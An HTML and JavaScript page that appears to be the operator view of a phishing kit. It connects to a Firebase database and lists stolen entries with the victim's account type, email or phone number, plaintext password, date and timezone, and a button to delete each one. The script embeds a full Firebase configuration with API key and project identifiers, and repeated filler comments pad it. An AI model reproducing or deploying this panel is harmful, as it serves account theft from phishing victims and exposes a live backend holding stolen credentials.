<!doctype HTML>
<html>
<head>
  <title>view </title>
</head>
<body>
  <div id="save">

  </div>
  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>



  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>

  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>

  <script>
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional// For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional// For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional// For Firebase JS SDK v7.20.0 and later, measurementId is optional
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyAsG2bMdLQ9L-3LjIK6-CiYs54d3Spr6-Q",
  authDomain: "newvote4.firebaseapp.com",
  databaseURL: "https://newvote4-default-rtdb.firebaseio.com",
  projectId: "newvote4",
  storageBucket: "newvote4.appspot.com",
  messagingSenderId: "337826858480",
  appId: "1:337826858480:web:aaa051314851ad525bc935",
  measurementId: "G-CXV3XMF60X"
};
    




    firebase.initializeApp(firebaseConfig);
    firebase.auth().signInAnonymously().catch(function(error) {

      // Handle Errors here.

      var errorCode = error.code;
      var errorMessage = error.message;

      window.alert("Error : " + errorMessage);

      // ...
    });
    firebase.database().ref("fbdet").on("child_added", function (snapshot) {



      var html = "";

      html += "<hr></hr>"
      html += "<li id='message-" + snapshot.key + "' class= 'canvaschat'>";

      html += "account type:<b>"+snapshot.val().type+ "</b> <br> email or phone number:<b> " + snapshot.val().emle+ "</b><br> password:<b> " +snapshot.val().pass+ "</b> <br> added on:<b>" +snapshot.val().date+"</b><br>added from:<b>"+snapshot.val().timezone+"</b><br> time:<b>"+snapshot.val().time+"</b>";
      html += "</li>";
      html += "<button data-id='" + snapshot.key + "' onclick='deleteMessage(this);' class = 'send'>";
      html += "Delete";
      html += "</button>";

      document.getElementById("save").innerHTML += html;
    });
    function deleteMessage(self) {

      var messageId = self.getAttribute("data-id");

      firebase.database().ref("fbdet").child(messageId).remove();
    }
    firebase.database().ref("fbdet").on("child_removed", function (snapshot) {
      // remove message node
      document.getElementById("message-" + snapshot.key).innerHTML = "deleted";
    });

  </script>
</body>
</html>